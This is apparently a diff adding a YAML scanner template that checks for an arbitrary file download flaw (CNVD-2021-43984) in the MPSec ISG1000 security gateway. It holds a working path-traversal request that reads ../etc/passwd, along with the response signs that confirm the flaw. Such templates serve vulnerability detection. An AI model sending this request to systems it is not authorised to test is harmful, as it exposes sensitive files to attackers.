@@ -1,0 +1,28 @@
+id: CNVD-2021-43984
+brief:
+    title: MPSec ISG1000 Security Gateway - Arbitrary File Download
+    by: DhiyaneshDk
+    level: high
+    about: The MPSec ISG1000 safety gateway at MP Communications Technology Co., Ltd. has any file download loophole, and attackers can use the loophole to obtain sensitive information.
+    label:
+        - cnvd2021
+        - cnvd
+        - mpsec
+        - maipu
+        - lfi
+        - isg
+        - vuln
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/webui/?g=sys_dia_data_down&file_name=../etc/passwd'
+      signs:
+        - "on": word
+          has:
+            - text/plain
+            - USGSESSID=
+          in: header
+          need: all
+        - "on": status
+          status:
+            - 200
